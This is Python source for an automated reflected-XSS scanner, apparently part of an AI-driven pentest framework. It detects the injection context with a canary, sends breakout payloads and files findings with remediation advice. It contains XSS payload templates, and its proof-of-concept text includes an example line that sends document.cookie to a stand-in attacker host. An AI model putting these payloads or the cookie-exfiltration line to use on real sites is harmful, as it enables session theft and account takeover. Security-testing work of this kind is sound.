"""`scan_xss` — context-aware deterministic XSS specialist.

Two-phase probe per (url, param):

  1. **Context detect.** Send a benign alphanumeric canary
     (`STRIXXXXXXX`, no special chars). Find every occurrence in
     the response and classify each by surrounding bytes (HTML body
     / attribute / JS string / URL / CSS — see `xss_contexts`).
  2. **Per-context attack.** For each detected context, send the
     breakout payload cohort tailored to that context. A finding is
     emitted only when the payload's *evidence marker* (a substring
     containing the breakout characters) appears verbatim in the
     response — i.e. the server did not escape the breakout.

Pre-Phase-4 history
-------------------

Phase 3b shipped a 3-payload deterministic prober (HTML-body
context only: `<script>`, `<img onerror>`, `<svg onload>`). It
sidestepped LLM prompt-compliance issues (gemini-2.5-pro invented
tag names, wrong params, over-emitted from training data) but
missed every attribute / JS-string / URL / CSS reflection. On
OWASP Juice Shop, attribute + JS-string contexts together
outnumber HTML-body reflections roughly 2:1, so the depth ceiling
was 30-40% of practical reflected-XSS surface.

This rewrite (Phase 4) keeps the deterministic auto-emit harness
and the LLM-free probe logic but moves the payload set into a
context-aware module (`xss_contexts.py`). The module is unit-tested
independently of the HTTP probe loop so context classification can
evolve without touching the orchestration here.

Why deterministic (still)
-------------------------

  * Probe logic is Python — gemini cannot mis-format it.
  * Auto-emit via `tracer.add_vulnerability_report` — no
    `<function=create_vulnerability_report>` translation step.
  * Single tool call from the lead's perspective:
    `scan_xss(url=..., params=[...])` returns a `SpecialistResult`
    with the count of findings actually emitted, plus the inner-LLM
    adaptive-retry orchestrator engages on 0-finding outcomes
    (Phase 3b carry-over).

Detection rules
---------------

For each (param_name) — exactly ONE context-detect probe + up to
~4 per-context attack probes (capped via cohort size). A finding
is emitted on the first successful breakout; subsequent breakouts
on the same (path, param) are de-duplicated to keep the wire-cost
predictable.

Limitations
-----------

  * No DOM-XSS — that's the browser-automation specialist's job.
  * No auth replay beyond what `SecurityContext` already injects.
  * Context detection is heuristic (see `xss_contexts.py`
    docstring): falls open to `html_body` cohort when classification
    is ambiguous. Cost of a misclassification: ~3 wasted HTTP probes.
"""

from __future__ import annotations

import logging
import secrets
import string
from typing import Any
from urllib.parse import parse_qs, urlencode, urlparse, urlunparse

from strix.tools.specialist.registry import register_specialist_tool
from strix.tools.specialist.result import (
    FindingDraft,
    SpecialistResult,
)
from strix.tools.specialist.xss_contexts import (
    breakout_fired,
    detect_contexts,
    payloads_for_context,
)


logger = logging.getLogger(__name__)


# Retained for `_rerun_xss` (the auto-verify-patch handler), which
# fires a single tight html-body probe rather than re-running the
# full context-detect+attack flow. Keeps re-run cost predictable
# (one HTTP call) when the agent is re-verifying after a patch.
_DEFAULT_PAYLOAD_TEMPLATES: tuple[str, ...] = (
    "<script>alert('{canary}')</script>",
    "<img src=x onerror=alert('{canary}')>",
    "<svg/onload=alert('{canary}')>",
)


# Patterns that indicate the response HTML-escaped the payload (so
# the reflection is harmless). Presence of ANY of these for a given
# canary means the host correctly sanitised that injection.
_ESCAPED_FRAGMENTS_TEMPLATE: tuple[str, ...] = (
    "&lt;script",          # < → &lt;
    "&#60;script",         # < → &#60;
    "&#x3c;script",        # < → &#x3c; (lowercase)
    "&#x3C;script",        # < → &#x3C; (uppercase)
    "%3Cscript",           # < → %3C (URL-encoded)
    "\\u003cscript",       # < → < (JS-encoded)
)


def _extract_content_type(resp: dict[str, Any]) -> str:
    """Pull the response Content-Type from the proxy_manager response
    dict. Tolerates several shapes the proxy / test mocks emit:
    `headers={...}`, `response_headers={...}`, or a `content_type`
    top-level key. Returns "" when unknown."""
    headers = resp.get("headers") or resp.get("response_headers") or {}
    if isinstance(headers, dict):
        for k, v in headers.items():
            if isinstance(k, str) and k.lower() == "content-type":
                return str(v) if v is not None else ""
    ct = resp.get("content_type")
    if isinstance(ct, str):
        return ct
    return ""


def _make_canary() -> str:
    """Cryptographically random 12-char alphanumeric canary. Embedded
    in the payload so reflections can be uniquely attributed even
    when multiple payloads share a target."""
    alphabet = string.ascii_uppercase + string.digits
    return "STRIX" + "".join(secrets.choice(alphabet) for _ in range(7))


def _build_url_with_param(
    url: str, *, param_name: str, value: str,
    other_params: dict[str, str] | None = None,
) -> str:
    """Replace `param_name` in URL's query string with `value` while
    preserving other params. If the URL has no query string, attaches
    one with the param + any extras."""
    parts = urlparse(url)
    qs = parse_qs(parts.query, keep_blank_values=True)
    # Flatten parse_qs's list-valued dict to single-value strings.
    flat: dict[str, str] = {k: (v[0] if v else "") for k, v in qs.items()}
    if other_params:
        for k, v in other_params.items():
            if k != param_name and k not in flat:
                flat[k] = v
    flat[param_name] = value
    new_query = urlencode(flat, doseq=False)
    return urlunparse(parts._replace(query=new_query))


def _is_payload_escaped(body: str, canary: str) -> bool:
    """True when the response shows the payload was HTML/URL-escaped
    or otherwise sanitised (canary present but only inside an
    escaped form). False when the canary appears in raw payload
    form with a LITERAL `<` opening a tag.

    Strategy: find every occurrence of the canary; for each, look
    backwards up to 80 chars for a literal `<` (raw tag opening). If
    the closest `<` before the canary is a LITERAL one and the
    intervening content is short + tag-shaped (no `&lt;` or `%3C`
    intervening), the canary appears inside a real HTML tag —
    UNESCAPED. Otherwise the canary appears inside an escape
    sequence (`&lt;...{canary}...&gt;` or `%3C...{canary}...%3E`)
    — ESCAPED.

    Conservative — when in doubt, return True (escaped) so we don't
    false-alarm. Real reflected XSS has an obvious `<TAG{canary}>`
    or `<TAG attr=...{canary}...>` pattern in the body.
    """
    if canary not in body:
        return False
    idx = 0
    while True:
        idx = body.find(canary, idx)
        if idx < 0:
            break
        # Look backwards 80 chars for the nearest `<` or `&lt;` /
        # `%3C` / `&#60;` / `<`.
        window_start = max(0, idx - 80)
        prefix = body[window_start:idx].lower()
        # Find the last `<` (raw) and the last escape variant.
        last_raw = prefix.rfind("<")
        last_escapes: list[int] = []
        for esc in ("&lt;", "%3c", "&#60;", "&#x3c;", "\\u003c"):
            p = prefix.rfind(esc)
            if p >= 0:
                last_escapes.append(p)
        nearest_escape = max(last_escapes) if last_escapes else -1
        if last_raw > nearest_escape:
            # Raw `<` is closer to canary than any escape → unescaped.
            return False
        # No raw `<` before canary, OR an escape is closer → treat
        # this occurrence as escaped. Try the next occurrence.
        idx += 1
    # Every occurrence of the canary was preceded by an escape (or no
    # `<` at all — e.g., reflected inside a `<input value="...">` —
    # which is also benign because the value attribute is escaped).
    return True


_CONTEXT_TITLE: dict[str, str] = {
    "html_body": "HTML body",
    "html_attr_double": "HTML double-quoted attribute",
    "html_attr_single": "HTML single-quoted attribute",
    "html_attr_unquoted": "HTML unquoted attribute",
    "url_attr": "URL-bearing attribute (href/src/etc.)",
    "js_string_double": "JavaScript double-quoted string literal",
    "js_string_single": "JavaScript single-quoted string literal",
    "js_block": "JavaScript code block",
    "css": "CSS / <style> block",
    "json_reflect": "JSON response (likely text/html misconfig)",
}


_CONTEXT_REMEDIATION: dict[str, str] = {
    "html_body": (
        "HTML-escape the user input before insertion (`<`, `>`, `&`, "
        "`\"`, `'`). Use the framework's auto-escape helper "
        "(Django auto-escape, Jinja `|e`, React JSX text node, "
        "ASP.NET `Html.Encode`, OWASP Java Encoder)."
    ),
    "html_attr_double": (
        "Apply HTML-attribute encoding inside double-quoted attribute "
        "values (`\"` → `&quot;`, plus the base HTML escapes). The "
        "HTML-body escape helper is insufficient on its own — `\"` "
        "must be encoded specifically because it terminates the "
        "attribute."
    ),
    "html_attr_single": (
        "Apply HTML-attribute encoding for single-quoted attribute "
        "values (`'` → `&#x27;`, plus base HTML escapes). The "
        "HTML-body escape helper is insufficient — `'` must be "
        "encoded specifically."
    ),
    "html_attr_unquoted": (
        "DO NOT emit unquoted attributes when the value contains "
        "user input — there is no robust escape strategy. Quote the "
        "attribute (preferably double-quoted) and apply HTML-"
        "attribute encoding to the value."
    ),
    "url_attr": (
        "Validate the URL scheme against an allowlist (`http`, "
        "`https`, `mailto`) before inserting into `href` / `src` / "
        "`formaction` / etc. Reject `javascript:`, `data:`, `vbscript:`, "
        "and other executable schemes. Then HTML-attribute-encode "
        "the result."
    ),
    "js_string_double": (
        "Use JSON.stringify (or equivalent JS-string encoder) to "
        "serialise the value into the script; never concatenate user "
        "input into a JS string literal. Best practice: render the "
        "value into a `<script type=\"application/json\">` tag and "
        "consume it via DOM lookup, never `<script>var x = \"...\"</script>`."
    ),
    "js_string_single": (
        "Use JSON.stringify (or equivalent JS-string encoder) to "
        "serialise the value. Never concatenate user input into a "
        "JS string literal."
    ),
    "js_block": (
        "Do NOT inject user input into JavaScript code. Render it as "
        "JSON (`<script type=\"application/json\">`) and consume via "
        "DOM lookup, OR pass via a data-* attribute and read with "
        "`dataset`."
    ),
    "css": (
        "Strip or encode `<`, `>`, `(`, `)` from values inserted into "
        "CSS. Do NOT include user input in `<style>` or `style=` "
        "attributes when avoidable. Use CSS custom properties (`--name`) "
        "set via JavaScript with the value type-checked."
    ),
    "json_reflect": (
        "Set `Content-Type: application/json; charset=utf-8` and "
        "DO NOT include user input in a `text/html`-served response. "
        "If the endpoint must serve HTML, apply HTML-body encoding."
    ),
}


def _emit_finding(
    *,
    url: str,
    param: str,
    payload: str,
    canary: str,
    response_excerpt: str,
    context: str = "html_body",
) -> str | None:
    """Emit via `tracer.add_vulnerability_report`. Returns the finding
    id on success, None on failure (best-effort — never raises)."""
    try:
        from strix.telemetry.tracer import get_global_tracer

        tracer = get_global_tracer()
        if tracer is None:
            return None
        ctx_human = _CONTEXT_TITLE.get(context, context)
        ctx_remediation = _CONTEXT_REMEDIATION.get(
            context, _CONTEXT_REMEDIATION["html_body"],
        )
        return tracer.add_vulnerability_report(
            title=f"Reflected XSS in `{param}` ({ctx_human})",
            severity="medium",
            cwe="CWE-79",
            endpoint=url,
            target=url,
            category="xss",
            verification_status="verified",
            confidence=0.9,
            description=(
                f"The `{param}` parameter at `{url}` reflects "
                f"user-supplied input into the response body without "
                f"context-appropriate escaping. The injection lands "
                f"in the **{ctx_human}** context; the payload "
                f"`{payload}` produced an unescaped reflection of "
                f"the canary token `{canary}` in the response, "
                f"confirming the breakout succeeded for that context."
            ),
            impact=(
                "Reflected XSS. An attacker can craft a malicious "
                "URL targeting authenticated users; clicking the URL "
                "executes attacker-controlled JavaScript in the "
                "victim's browser session, leading to session-token "
                "theft, CSRF token leakage, account takeover, or "
                "delivery of malware via the trusted origin."
            ),
            technical_analysis=(
                f"Injection context: {ctx_human} ({context}).\n"
                f"Probe: {param}={payload}\n"
                f"Response excerpt (canary {canary} present, "
                f"context-breakout evidence intact):\n"
                f"{response_excerpt[:1500]}"
            ),
            poc_description=(
                f"1. Send a request to {url} with `{param}` set to "
                f"`{payload}`.\n"
                f"2. Render the response in a browser; the JavaScript "
                f"in the payload executes (the `STRIX_X({canary})` "
                f"call in the payload confirms the breakout fired).\n"
                f"3. Replace the synthetic `STRIX_X(...)` call with a "
                f"credential-exfiltrating script for production "
                f"attacks (e.g. `document.location='https://evil/' + "
                f"document.cookie`)."
            ),
            poc_script_code=(
                f"curl -sS '{url}' --data-urlencode '{param}={payload}' -G"
            ),
            remediation_steps=(
                f"{ctx_remediation} "
                "Additionally, deploy a strict Content-Security-Policy "
                "as defense-in-depth (no `'unsafe-inline'` for "
                "`script-src`; use nonces or hashes)."
            ),
            cvss_breakdown={
                "AV": "N", "AC": "L", "PR": "N", "UI": "R",
                "S": "C", "C": "L", "I": "L", "A": "N",
            },
            reasoning_trace=[
                f"Sent benign canary `{canary}` to {param}=; "
                f"classified injection context as {context}.",
                f"Sent context-specific breakout payload `{payload}`.",
                f"Response contains evidence marker (substring "
                f"identifying successful breakout) verbatim — "
                f"server did not escape the breakout characters.",
                f"Reflection in {ctx_human} context → executable "
                f"JavaScript.",
            ],
        )
    except Exception as e:  # noqa: BLE001
        logger.debug("scan_xss: emit failed: %s", e, exc_info=True)
        return None


def _record_in_kg(
    *, finding_id: str | None, url: str, param: str,
) -> None:
    """Side-effect of a successful emit: populate `Vuln` + `Surface`
    + `AFFECTS` in the §3 typed KG. Best-effort; never raises."""
    try:
        from strix.agents.kg_emit import record_finding_in_kg
        record_finding_in_kg(
            finding_id=finding_id,
            url=url,
            param=param,
            cwe="CWE-79",
            severity="medium",
            category="xss",
            method="GET",
            detection_kind="reflected",
            confidence=0.9,
        )
    except Exception as e:  # noqa: BLE001
        logger.debug("scan_xss: kg record failed: %s", e, exc_info=True)


# ---------------------------------------------------------------------------
# §4 / P1 — re-run handler for auto_verify_patch.
# ---------------------------------------------------------------------------


def _rerun_xss(*, finding_context: dict[str, Any]) -> "Any":
    """Re-fire the reflected-XSS canary probe."""
    from strix.agents.rerun_registry import RerunResult
    import time as _time
    start = _time.monotonic()
    url = finding_context.get("url") or ""
    param = finding_context.get("param") or ""
    if not url or not param:
        return RerunResult(outcome="indeterminate",
                           detail="missing url/param")
    try:
        from strix.tools.proxy.proxy_manager import get_proxy_manager
        pm = get_proxy_manager()
    except Exception:  # noqa: BLE001
        return RerunResult(outcome="indeterminate", detail="proxy unavailable")
    canary = _make_canary()
    payload = _DEFAULT_PAYLOAD_TEMPLATES[0].format(canary=canary)
    probe_url = _build_url_with_param(url, param_name=param, value=payload)
    try:
        resp = pm.send_simple_request(
            "GET", probe_url, headers={}, body="", timeout=15,
        )
    except Exception as e:  # noqa: BLE001
        return RerunResult(
            outcome="indeterminate",
            detail=f"transport error: {e}",
            elapsed_seconds=_time.monotonic() - start,
        )
    body = resp.get("body") or ""
    if not isinstance(body, str):
        body = ""
    if canary in body and not _is_payload_escaped(body, canary):
        return RerunResult(
            outcome="still_fires",
            detail="canary still appears unescaped",
            elapsed_seconds=_time.monotonic() - start,
            evidence={"probe_url": probe_url},
        )
    return RerunResult(
        outcome="no_longer_fires",
        detail="canary absent or escaped",
        elapsed_seconds=_time.monotonic() - start,
    )


try:
    from strix.agents.rerun_registry import register_rerun
    register_rerun(category="xss", cwe="CWE-79")(_rerun_xss)
except Exception as e:  # noqa: BLE001
    logger.debug("scan_xss: rerun register failed: %s", e)


@register_specialist_tool(
    category="xss-specialist",
    # Phase 3b — adaptive-retry inner-LLM enabled. When the
    # first-pass procedural probe returns 0 findings the
    # orchestrator engages a single LLM call to suggest adapted
    # args (different param / method / body shape) and re-runs
    # the procedural probe with those. Kill switch:
    # STRIX_SPECIALIST_INNER_LLM_DISABLED=1.
    llm=True,
    system_prompt_path="tools/specialist/prompts/xss.md",
    # `cost_usd` is the inner-LLM retry budget cap. ~$0.005 on
    # Gemini Flash, ~$0.02 on Claude Sonnet per call.
    default_budget={"cost_usd": 0.05, "max_wall_seconds": 90},
    sandbox_execution=False,  # host execution; proxy_manager handles host.docker.internal → 127.0.0.1 fallback
    provenance="framework",
    mitre_techniques=["T1059.007"],  # Command/Scripting: JavaScript
)
def scan_xss(
    *,
    url: str,
    params: list[str] | str | None = None,
    param: str | None = None,
    other_params: dict[str, str] | None = None,
    extra_headers: dict[str, str] | None = None,
    method: str = "GET",
    body_template: dict[str, Any] | str | None = None,
    body_format: str = "auto",
) -> SpecialistResult:
    """Deterministic reflected-XSS scanner that probes given params,
    emits findings via the tracer, and returns a SpecialistResult.

    Args:
        url: target URL (e.g. `http://example.com/search.aspx`).
            Existing query params are preserved. May contain
            `{param}` placeholders for path-param substitution.
        params: list of param names to probe. When None / empty,
            inferred from (1) URL query-string keys, (2)
            `body_template` dict keys, (3) `{name}` placeholders
            in the URL path.
        other_params: optional baseline values for OTHER query params.
        extra_headers: optional headers to forward (e.g. auth).
        method: HTTP method. Default `GET` (Phase 3b). Use
            `POST`/`PUT` for body-based reflection probes.
        body_template: optional body. dict → JSON or form (per
            body_format); str → raw body with `{param}` placeholder.
            None → query-string substitution (Phase 3b behaviour).
        body_format: `"json"` / `"form"` / `"auto"`.

    Auto-emits one `add_vulnerability_report` per (param × payload)
    pair where reflection is detected unescaped.

    Examples:
        # Phase 3b — GET with query string.
        scan_xss(url="http://x/search?q=test", params=["q"])

        # Phase 3c — POST + JSON body (search API that reflects).
        scan_xss(
            url="http://x/api/search",
            method="POST",
            params=["query"],
            body_template={"query": "test", "limit": 10},
        )

        # Phase 3c — path param.
        scan_xss(
            url="http://x/users/{name}",
            method="GET",
            params=["name"],
        )
    """
    if not isinstance(url, str) or not url.strip():
        return SpecialistResult(status="error", error="url required")
    url = url.strip()

    from strix.tools.specialist._request_builders import build_request

    # Roadmap §8.5 Phase 3c — forgiving arg handling (mirror scan_sqli).
    # Accept `param=` (singular), `params=` as string, and JSON-string
    # `body_template=`. Without this, every gemini-formatted call
    # errors out as a TypeError before the actual probe fires.
    if param and not params:
        params = [param]
    if isinstance(params, str):
        params = [params]
    if isinstance(body_template, str):
        s = body_template.strip()
        if s.startswith("{") and s.endswith("}"):
            try:
                import json as _json
                parsed_template = _json.loads(s)
                if isinstance(parsed_template, dict):
                    body_template = parsed_template
            except Exception:  # noqa: BLE001
                pass

    # Roadmap §8.5 Phase 7 — auto-include captured auth from
    # SecurityContext when extra_headers don't already have one.
    # Closes the gap where reflected-XSS endpoints behind auth (admin
    # panel search, post-login dashboards) need a session to render.
    extra_headers = dict(extra_headers or {})
    if "Authorization" not in extra_headers and "authorization" not in {h.lower() for h in extra_headers}:
        try:
            from strix.agents.security_context import list_auth_states

            for state in list_auth_states():
                if state.bearer:
                    extra_headers["Authorization"] = f"Bearer {state.bearer}"
                    break
                if state.cookies:
                    extra_headers["Cookie"] = "; ".join(f"{k}={v}" for k, v in state.cookies.items())
                    break
        except Exception:  # noqa: BLE001
            pass

    parsed = urlparse(url)
    if not params:
        if parsed.query:
            params = list(parse_qs(parsed.query, keep_blank_values=True).keys())
        elif isinstance(body_template, dict):
            params = list(body_template.keys())
        else:
            import re as _re
            params = _re.findall(r"\{([a-zA-Z_][a-zA-Z0-9_]*)\}", url)
    if not params:
        return SpecialistResult(
            status="partial",
            error="no params supplied and could not infer from URL/body",
            evidence=[
                f"scan_xss invoked on {url!r} with no params; "
                "supply `params=[...]`, include a query string, "
                "supply a `body_template` dict, or use `{name}` "
                "placeholders in the URL path."
            ],
        )

    drafts: list[FindingDraft] = []
    evidence: list[str] = []
    emitted_count = 0
    probe_count = 0
    seen_endpoint_param: set[tuple[str, str]] = set()

    try:
        from strix.tools.proxy.proxy_manager import get_proxy_manager

        pm = get_proxy_manager()
    except Exception as e:  # noqa: BLE001
        return SpecialistResult(
            status="error",
            error=f"proxy_manager unavailable: {type(e).__name__}: {e}",
        )

    # Per-param flow:
    #   1. Send ONE context-detect probe with a benign alphanumeric
    #      canary; classify where the canary lands in the response.
    #   2. For each detected context, send the breakout payload cohort
    #      for that context. Emit on first breakout per (path, param)
    #      — same de-dup discipline as Phase 3b.
    #
    # Cost ceiling: 1 + sum(cohort sizes) ≈ 5-12 HTTP probes per
    # param worst-case. The fixed Phase-3b cost was 3 probes/param.
    # The extra probes are spent on coverage we previously missed.
    contexts_to_try_max = 4

    for param in params:
        if not isinstance(param, str) or not param.strip():
            continue
        param = param.strip()

        # ---- Phase 1: context-detect probe ----
        detect_canary = _make_canary()
        try:
            req_method, req_url, req_headers, req_body = build_request(
                url=url, method=method,
                param_name=param, payload=detect_canary,
                body_template=body_template, body_format=body_format,
                other_params=other_params, extra_headers=extra_headers,
            )
            detect_resp = pm.send_simple_request(
                req_method, req_url,
                headers=req_headers,
                body=req_body,
                timeout=15,
            )
        except Exception as e:  # noqa: BLE001
            evidence.append(f"context-detect probe failed for {param!r}: {e}")
            continue
        probe_count += 1

        if "error" in detect_resp and not detect_resp.get("status_code"):
            evidence.append(
                f"transport error during context-detect for {param!r}: "
                f"{detect_resp.get('error', '<unknown>')}"
            )
            continue

        detect_body = detect_resp.get("body") or ""
        if not isinstance(detect_body, str):
            detect_body = str(detect_body)
        content_type = _extract_content_type(detect_resp)

        if detect_canary not in detect_body:
            evidence.append(
                f"{param!r}: canary not reflected — no XSS surface"
            )
            continue

        contexts = detect_contexts(detect_body, detect_canary, content_type)
        if not contexts:
            # Defensive — `detect_contexts` already falls open to
            # html_body, but pin it explicitly so an empty tuple
            # never silently skips the param.
            contexts = ("html_body",)

        # Bound the per-param probe budget by capping how many
        # contexts we attack. Order is alphabetical from
        # `detect_contexts` — fine for v1; future work could
        # priority-order by historical hit-rate.
        contexts_attempted = contexts[:contexts_to_try_max]
        evidence.append(
            f"{param!r}: contexts detected = {list(contexts_attempted)}"
        )

        # ---- Phase 2: per-context attack probes ----
        breakout_emitted = False
        key = (parsed.path or "/", param)
        if key in seen_endpoint_param:
            continue

        for ctx in contexts_attempted:
            if breakout_emitted:
                break
            for payload_obj in payloads_for_context(ctx):
                attack_canary = _make_canary()
                attack_payload, _evidence_marker = payload_obj.materialise(
                    attack_canary,
                )
                try:
                    req_method, req_url, req_headers, req_body = build_request(
                        url=url, method=method,
                        param_name=param, payload=attack_payload,
                        body_template=body_template, body_format=body_format,
                        other_params=other_params,
                        extra_headers=extra_headers,
                    )
                    resp = pm.send_simple_request(
                        req_method, req_url,
                        headers=req_headers,
                        body=req_body,
                        timeout=15,
                    )
                except Exception as e:  # noqa: BLE001
                    evidence.append(
                        f"attack probe failed for {param!r} "
                        f"({ctx}): {e}"
                    )
                    continue
                probe_count += 1

                if "error" in resp and not resp.get("status_code"):
                    evidence.append(
                        f"transport error attacking {param!r} "
                        f"({ctx}): {resp.get('error', '<unknown>')}"
                    )
                    continue

                body = resp.get("body") or ""
                if not isinstance(body, str):
                    body = str(body)

                if not breakout_fired(body, payload_obj, attack_canary):
                    continue

                # Breakout confirmed for `ctx`. Emit + KG.
                seen_endpoint_param.add(key)
                _, evidence_str = payload_obj.materialise(attack_canary)
                ev_idx = body.find(evidence_str)
                if ev_idx < 0:
                    # Should be impossible if breakout_fired returned
                    # True, but defensive.
                    ev_idx = body.find(attack_canary)
                excerpt_start = max(0, ev_idx - 100)
                excerpt_end = min(len(body), ev_idx + 200)
                excerpt = body[excerpt_start:excerpt_end]

                report_id = _emit_finding(
                    url=url, param=param,
                    payload=attack_payload, canary=attack_canary,
                    response_excerpt=excerpt,
                    context=ctx,
                )
                if report_id:
                    emitted_count += 1
                    _record_in_kg(
                        finding_id=report_id, url=url, param=param,
                    )
                drafts.append(FindingDraft(
                    title=(
                        f"Reflected XSS in `{param}` "
                        f"({_CONTEXT_TITLE.get(ctx, ctx)})"
                    ),
                    severity="medium",
                    cwe="CWE-79",
                    endpoint=url,
                    category="xss",
                    verification_status="verified",
                    confidence=0.9,
                    description=(
                        f"Reflected XSS in {param} at {url}; "
                        f"context={ctx}, payload broke out via "
                        f"{attack_payload[:60]}"
                    ),
                ))
                evidence.append(
                    f"BREAKOUT: {param}={attack_payload[:40]}... "
                    f"context={ctx} evidence marker found"
                )
                breakout_emitted = True
                break

    # Roadmap §8.5 Phase 5 — record this endpoint as probed for XSS
    # in the SecurityContext so the lead doesn't reprobe and can
    # see the coverage map.
    try:
        from strix.agents.security_context import record_endpoint

        record_endpoint(url, method=method, params=params, probed_for="xss")
    except Exception:  # noqa: BLE001
        pass

    # Phase 1.6 — decision provenance log
    try:
        from strix.agents.decision_log import record_decision

        record_decision(
            kind="specialist_invocation",
            target=url,
            actor={"tool_name": "scan_xss"},
            input={
                "method": method,
                "params": list(params) if params else [],
                "probes_sent": probe_count,
            },
            output={
                "findings_emitted": emitted_count,
                "drafts": len(drafts),
            },
        )
    except Exception:  # noqa: BLE001
        pass

    return SpecialistResult(
        status="ok",
        findings=drafts,
        evidence=evidence[:50],
        next_probes_suggested=(
            ["follow-up with browser-automation specialist for DOM-XSS validation"]
            if drafts else
            ["no reflected-XSS detected; consider authenticated probes "
             "or stored-XSS sinks if app has user-content surfaces"]
        ),
        tool_metadata={
            "probes_sent": probe_count,
            "params_probed": len(params),
            "findings_emitted_to_tracer": emitted_count,
            "scheme": parsed.scheme,
            "host": parsed.netloc,
        },
    )
